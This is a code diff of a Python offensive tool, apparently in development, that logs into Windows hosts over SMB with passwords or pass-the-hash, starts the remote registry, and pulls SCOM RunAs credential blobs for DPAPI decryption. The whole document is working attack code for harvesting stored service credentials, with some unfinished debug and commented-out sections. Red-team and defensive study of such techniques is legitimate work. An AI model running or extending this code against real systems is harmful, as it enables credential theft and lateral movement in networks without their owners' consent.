@@ -1,25 +1,30 @@
 import asyncio
 
 from lib.logger import logger
-from lib.sessions import smb_session
+from lib.sessions import smb_session, ImpacketSMB
 from lib.scripts.helpers import HELPERS
+from lib.scripts.dpapi import DPAPI
 
 from aiosmb.dcerpc.v5.rpcrt import DCERPCException
 from aiosmb.commons.interfaces.machine import SMBMachine
 from aiosmb.dcerpc.v5.common.service import ServiceStatus
 
 
+
 #disable aiosmb logging
 import logging
 logging.getLogger('aiosmb').setLevel(logging.ERROR)
 
+# start with impacket to learn the flow
+
+# from impacket.dpapi import DPAPI_BLOB
 
 
 class DPAPIHUNTER():
     
     def __init__(self, username:str = None, password: str = None, hashes: str = None, aes: str = None, 
-                 kerberos: str = False, no_pass: str  =False, domain: str = None, dc_ip: str = None, 
-                 ldaps:str = False, fqdn: str = None, verbose: str = False):
+                 kerberos: str = False, no_pass: bool = False, domain: str = None, dc_ip: str = None, 
+                 fqdn: str = None, verbose: str = False):
         #auth vars
         self.username = username
         self.password= password
@@ -82,7 +87,6 @@ class DPAPIHUNTER():
     
     async def query_managment_groups(self) -> list:
         """Queries target host for SCOM Managment Group Names"""
-
         mg_regpath = "HKLM\\SYSTEM\\CurrentControlSet\\Services\\HealthService\\Parameters\\Management Groups"
 
         self.reg, err = await self.machine.get_regapi()
@@ -111,7 +115,6 @@ class DPAPIHUNTER():
 
     async def query_registry(self) -> list:
         """Top level function to enumerate target's registry"""
-
         try:
             #Query for MGMT Group Names
             mg_regpath, mg_groups = await self.query_managment_groups()
@@ -127,11 +130,13 @@ class DPAPIHUNTER():
                 logger.info("[-] Could not find RunAs credential blobs in registry. Target may not be a client.")
                 return None
             
-            #capture runas dpapi blobs
+            #Capture runas dpapi blobs
             runas_blobs = await self.enum_values(runas_blob_paths)
             
             if not runas_blobs:
-                logger.info("Could not ")
+                logger.info("Could not recover RunAs credentials")
+                
+            return runas_blobs
 
         except Exception as e:
             logger.info(e)
@@ -175,8 +180,27 @@ class DPAPIHUNTER():
                 logger.info("Something went wrong when attempting to start the service")
                 logger.info(err)
                 return False
-
-
+            
+            
+            
+    def decrypt_blob(self, blobs):
+        # Thanks to @tifkin_ for figuring out the entropy issue here
+        entropy_size = 0x400
+        
+        for blob in blobs:
+            blob_data = blob[:-entropy_size]
+            entropy = blob[-entropy_size:]
+        
+            # result = DPAPI_BLOB(blob_data)
+            logger.debug("[*] Got DPAPI blob:")
+            # logger.debug(result)
+            
+            print(type(blob_data))
+            
+            DPAPI.decrypt_blob(blob_data)
+            #    def decrypt(self, key, entropy = None):
+            
+        
     async def smbsession(self):
         """Sets up the smb session"""
 
@@ -185,6 +209,7 @@ class DPAPIHUNTER():
             "username": self.username,
             "password": self.password,
             "nt": self.hashes,
+            "aes": self.aes,
             "dcip": self.dc_ip,
             "fqdn": self.fqdn,  
             "protocol": self.protocol,
@@ -193,17 +218,14 @@ class DPAPIHUNTER():
         }
     
         smb_client = await smb_session(auth_options) 
-        return smb_client   
+        return auth_options, smb_client   
         
-        
-        
-
-
+    
     async def run(self):
         """Much of this was taken from examples provided by @skelsec"""
         HELPERS.create_db()
         if not self.smb_session:                               
-            self.smb_session = await self.smbsession()    
+            auth_options, self.smb_session = await self.smbsession()    
         
 
         remote_reg = await self.kick_remotereg() 
@@ -216,7 +238,15 @@ class DPAPIHUNTER():
         if not runas_blobs:
             exit()
         
-        #dpapi time
+        #need to be able to send the auth options to the impacket SMB session
+        #self.decrypt_blob(runas_blobs)
+        
+        #working            
+        impacket_smbconnection = ImpacketSMB(auth_options)
+        
+        decrypt = DPAPI(runas_blobs, impacket_smbconnection)
+        decrypt.decrypt_blob()
+        
 
 
             
